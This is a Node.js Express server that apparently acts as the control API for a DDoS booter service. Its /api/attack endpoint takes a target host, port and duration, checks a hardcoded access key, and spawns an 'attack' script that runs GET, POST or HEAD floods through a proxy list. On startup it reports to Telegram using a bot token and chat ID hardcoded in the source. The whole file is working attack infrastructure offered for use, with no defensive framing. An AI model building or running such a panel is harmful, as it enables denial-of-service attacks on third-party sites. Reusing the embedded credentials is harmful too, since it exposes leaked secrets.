const express = require("express");
const { spawn } = require("child_process");
const axios = require("axios");

const app = express();
const port = 8080;
const MAX_CONCURRENT_ATTACKS = 1;
const BOT_TOKEN = "7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw";
const CHAT_ID = "7371969470";

let activeAttacks = 0;
let currentPID = null;

const sendTelegramMessage = async (message) => {
    try { await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message }); console.log("Telegram message sent successfully."); }
    catch (error) { console.error("Error sending Telegram message:", error.message); }
};

const validateInput = ({ key, host, time, method, port }) =>
    (![key, host, time, method, port].every(Boolean)) ? "MISSING PARAMETERS" :
    (key !== "negan") ? "INVALID KEY" :
    (time > 200) ? "TIME MUST BE < 200S" :
    (port < 1 || port > 65535) ? "INVALID PORT" : null;

const executeAttack = (command, time) => {
    const childProcess = spawn(command.split(" ")[0], command.split(" ").slice(1), { stdio: "inherit" });
    currentPID = childProcess.pid;
    console.log(`Process ${currentPID} started.`);

    const cleanup = () => { activeAttacks--; currentPID = null; console.log(`Process ${childProcess.pid} ended. Slot freed.`); };

    childProcess.on("close", (code) => { console.log(`Process ${childProcess.pid} closed with code ${code}.`); cleanup(); });
    childProcess.on("error", (err) => { console.error(`Error executing command: ${err.message}`); cleanup(); });

    setTimeout(() => { if (currentPID === childProcess.pid) { console.error(`Process ${childProcess.pid} hung and was killed.`); childProcess.kill(); cleanup(); } }, time * 1000 + 10000);
};

const executeAllAttacks = (moduls, host, time) =>
    moduls.map((modul) => `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`).forEach((command) => executeAttack(command, time));

app.get("/api/attack", async (req, res) => {
    const { key, host, time, method, port, modul } = req.query;

    const response = (statusCode, status, message, data = {}) => res.status(statusCode).json({ status, message, ...data });

    if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) return response(429, "ERROR", "ANOTHER ATTACK IS IN PROGRESS");

    const validationMessage = validateInput({ key, host, time, method, port });
    if (validationMessage) return response(400, "ERROR", validationMessage);

    activeAttacks++;

    try {
        if (modul === "FULL") {
            executeAllAttacks(["GET", "POST", "HEAD"], host, time);
            response(200, "SUCCESS", "ATTACK COMMAND (GET, POST, HEAD) SENT", { host, port, time, modul: "GET POST HEAD", method, pid: currentPID });
        } else {
            const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
            executeAttack(command, time);
            response(200, "SUCCESS", "ATTACK COMMAND SENT", { host, port, time, modul, method, pid: currentPID });
        }
    } catch (error) {
        console.error("Error executing attack:", error.message);
        response(500, "ERROR", "ERROR EXECUTING ATTACK");
    }
});

app.listen(port, () => {
    console.log(`[API SERVER] RUNNING ON PORT ${port}`);
    sendTelegramMessage(`🔹 API Server is running on port ${port}`).catch((err) => console.error("Error sending Telegram message:", err));
});
